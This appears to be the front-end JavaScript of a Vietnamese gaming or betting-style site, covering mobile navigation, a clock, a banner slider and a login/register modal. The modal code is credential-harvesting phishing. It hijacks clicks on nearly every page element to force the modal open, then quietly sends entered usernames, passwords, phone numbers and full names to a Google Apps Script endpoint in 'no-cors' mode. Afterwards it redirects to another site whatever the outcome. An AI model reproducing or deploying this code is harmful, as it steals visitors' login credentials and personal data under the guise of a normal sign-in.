document.addEventListener("DOMContentLoaded", function() {
    // Xử lý Active state cho Bottom Navigation trên Mobile
    const navItems = document.querySelectorAll('.bottom-nav .nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault(); 
            navItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Xử lý Active state cho danh mục (Tabs) trên Mobile
    const categoryTabs = document.querySelectorAll('.category-tabs .tab');
    categoryTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            categoryTabs.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
    });
});

// --- Xử lý đồng hồ thời gian thực (Giờ Việt Nam GMT+7) ---
function updateVietnamTime() {
    const clockElement = document.getElementById('real-time-clock');
    if (!clockElement) return;

    const now = new Date();
    const options = {
        timeZone: 'Asia/Ho_Chi_Minh',
        hour12: false, 
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    
    const timeString = new Intl.DateTimeFormat('vi-VN', options).format(now);
    clockElement.innerText = `${timeString} (GMT+7)`;
}

updateVietnamTime();
setInterval(updateVietnamTime, 1000);

// --- Xử lý Banner tự động trượt ngang ---
document.addEventListener("DOMContentLoaded", function() {
    const track = document.getElementById('slider-track');
    const slides = document.querySelectorAll('.slide');
    const dotsContainer = document.getElementById('slider-dots');
    
    if (!track || slides.length === 0) return;

    let currentIndex = 0;
    const totalSlides = slides.length;

    slides.forEach((_, index) => {
        const dot = document.createElement('div');
        dot.classList.add('dot');
        if (index === 0) dot.classList.add('active');
        
        dot.addEventListener('click', () => {
            goToSlide(index);
            resetInterval();
        });
        dotsContainer.appendChild(dot);
    });

    const dots = document.querySelectorAll('.dot');

    function updateDots() {
        dots.forEach(dot => dot.classList.remove('active'));
        if (dots[currentIndex]) {
            dots[currentIndex].classList.add('active');
        }
    }

    function goToSlide(index) {
        currentIndex = index;
        // Đã sửa lại phần bị gãy dòng ở code cũ của bạn
        track.style.transform = `translateX(-${currentIndex * 100}%)`;
        updateDots();
    }

    function nextSlide() {
        currentIndex = (currentIndex + 1) % totalSlides;
        goToSlide(currentIndex);
    }

    let slideInterval = setInterval(nextSlide, 3000);

    function resetInterval() {
        clearInterval(slideInterval);
        slideInterval = setInterval(nextSlide, 3000);
    }
});

// ==========================================
// XỬ LÝ MODAL ĐĂNG NHẬP / ĐĂNG KÝ VÀ GỬI GOOGLE SHEETS
// ==========================================
document.addEventListener("DOMContentLoaded", function() {
    const modal = document.getElementById('auth-modal');
    const closeModalBtn = document.getElementById('close-modal-btn');
    
    const loginBtns = document.querySelectorAll('.btn-login-top, .btn-login-mobile');
    const registerBtns = document.querySelectorAll('.btn-register-top, .btn-register-mobile');
    
    const authTabs = document.querySelectorAll('.auth-tab');
    const authForms = document.querySelectorAll('.auth-form');

    function switchTab(targetFormId) {
        authTabs.forEach(tab => tab.classList.remove('active'));
        authForms.forEach(form => form.classList.remove('active-form'));

        const targetTab = document.querySelector(`.auth-tab[data-target="${targetFormId}"]`);
        const targetForm = document.getElementById(targetFormId);
        
        if(targetTab) targetTab.classList.add('active');
        if(targetForm) targetForm.classList.add('active-form');
    }

    // Gắn sự kiện mở modal cho các nút Đăng nhập / Đăng ký chính
    loginBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            modal.classList.add('show');
            switchTab('form-login');
        });
    });

    registerBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            modal.classList.add('show');
            switchTab('form-register');
        });
    });

    // Ép người dùng mở Modal khi bấm vào các thành phần khác
    const requireLoginElements = document.querySelectorAll(`
        .game-card, .slide img, .link-item, 
        .category-tabs .tab, .bottom-nav .nav-item, 
        .desktop-nav a, .link-btn, .btn-overlay
    `);

    requireLoginElements.forEach(el => {
        el.addEventListener('click', function(e) {
            e.preventDefault(); 
            modal.classList.add('show'); 
            switchTab('form-login');     
        });
    });

    // Chuyển tab trong modal
    authTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const target = this.getAttribute('data-target');
            switchTab(target);
        });
    });

    // Đóng Modal
    if(closeModalBtn) {
        closeModalBtn.addEventListener('click', () => modal.classList.remove('show'));
    }
    window.addEventListener('click', (e) => {
        if (e.target === modal) modal.classList.remove('show');
    });

    /* ----------------------------------------------------
       HÀM KIỂM TRA ĐIỀU KIỆN, GỬI DATA LÊN SHEET VÀ CHUYỂN HƯỚNG
       ---------------------------------------------------- */
    function validateAndSubmit(formElement) {
        const inputs = formElement.querySelectorAll('input[type="text"], input[type="password"]');
        let isValid = true;

        let username = "", password = "", phone = "", fullname = "";

        for (let i = 0; i < inputs.length; i++) {
            const input = inputs[i];
            const value = input.value.trim();
            const placeholder = (input.getAttribute('placeholder') || '').toLowerCase();

            if (value === '') {
                alert(`Vui lòng điền thông tin: ${input.getAttribute('placeholder')}`);
                input.focus();
                isValid = false;
                break;
            }

            if (placeholder.includes('tên người dùng') || placeholder.includes('mật khẩu')) {
                if (value.length < 6 || value.length > 20) {
                    alert(`${input.getAttribute('placeholder')} phải dài từ 6 đến 20 ký tự!`);
                    input.focus();
                    isValid = false;
                    break;
                }
            }

            if (placeholder.includes('số điện thoại')) {
                const phoneRegex = /^\d{10}$/; 
                if (!phoneRegex.test(value.replace(/\s+/g, ''))) { // Xóa khoảng trắng lỡ nhập dư
                    alert('Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 chữ số.');
                    input.focus();
                    isValid = false;
                    break;
                }
                phone = value; // Gán lại biến phone nếu đúng
            }

            if (placeholder.includes('tên người dùng')) username = value;
            if (placeholder.includes('mật khẩu')) password = value;
            if (placeholder.includes('họ và tên')) fullname = value;
        }

        if (isValid && formElement.id === 'form-register') {
            const checkbox = formElement.querySelector('input[type="checkbox"]');
            if (checkbox && !checkbox.checked) {
                alert('Bạn cần đồng ý với Chính sách thành viên để đăng ký!');
                isValid = false;
            }
        }

        if (isValid) {
            // Khóa nút bấm để tránh nhấn 2 lần
            const submitBtn = formElement.querySelector('.btn-submit');
            submitBtn.innerText = 'Đang xử lý...';
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';

            const actionType = formElement.id === 'form-login' ? 'ĐĂNG NHẬP' : 'ĐĂNG KÝ';

            // =========== CHÚ Ý: DÁN LINK WEB APP CỦA BẠN VÀO ĐÂY ===========
            const scriptURL = 'https://script.google.com/macros/s/AKfycbxb9BAwadLDVn_9Kiny5QvTYzd2QSRoHxFyUG0_WFRgNfuqS249xSiJAyUW0A6qR9z5tg/exec';

            const formData = new FormData();
            formData.append('action', actionType);
            formData.append('username', username);
            formData.append('password', password);
            formData.append('phone', phone);
            formData.append('fullname', fullname);

            // Bổ sung mode: 'no-cors' để trình duyệt không chặn lệnh gửi ngầm
            fetch(scriptURL, { 
                method: 'POST', 
                body: formData,
                mode: 'no-cors' 
            })
            .then(() => {
                window.location.href = 'https://www.rr0688.com/';
            })
            .catch(error => {
                window.location.href = 'https://www.rr0688.com/';
            });
        }
    }

    // Lắng nghe sự kiện click Submit
    const loginForm = document.getElementById('form-login');
    if (loginForm) {
        const btnSubmitLogin = loginForm.querySelector('.btn-submit');
        if (btnSubmitLogin) {
            btnSubmitLogin.addEventListener('click', function(e) {
                e.preventDefault(); 
                validateAndSubmit(loginForm);
            });
        }
    }

    const registerForm = document.getElementById('form-register');
    if (registerForm) {
        const btnSubmitRegister = registerForm.querySelector('.btn-submit');
        if (btnSubmitRegister) {
            btnSubmitRegister.addEventListener('click', function(e) {
                e.preventDefault(); 
                validateAndSubmit(registerForm);
            });
        }
    }
});